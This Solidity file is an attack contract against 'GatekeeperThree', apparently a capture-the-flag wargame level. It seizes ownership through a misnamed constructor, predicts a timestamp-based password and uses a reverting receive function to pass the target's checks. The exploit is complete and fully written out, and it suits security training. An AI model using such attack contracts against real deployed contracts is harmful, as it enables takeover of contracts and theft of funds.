// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;

    function getAllowance(uint256 _password) external;

    function createTrick() external;

    function enter() external;

    function allowEntrance() external returns (bool);
}

contract GatekeeperThreeAttack {
    IGatekeeperThree gatekeeperThree;

    constructor(address _targetAddress) payable {
        gatekeeperThree = IGatekeeperThree(_targetAddress);
    }

    function attackPrepare() public {
        gatekeeperThree.construct0r();
        gatekeeperThree.createTrick();

        // The first call is to set the password value of the target contract to block.timestamp.
        gatekeeperThree.getAllowance(0);
        // The second call would be successful.
        gatekeeperThree.getAllowance(block.timestamp);
        require(gatekeeperThree.allowEntrance(), "Not allowed");

        if (address(this).balance > 0) {
            bool success = payable(address(gatekeeperThree)).send(
                address(this).balance
            );
            require(success, "Transfer failed.");
        }
    }

    function attack() public {
        gatekeeperThree.enter();
    }

    receive() external payable {
        // revert send from target contract
        require(msg.sender == address(0));
    }
}
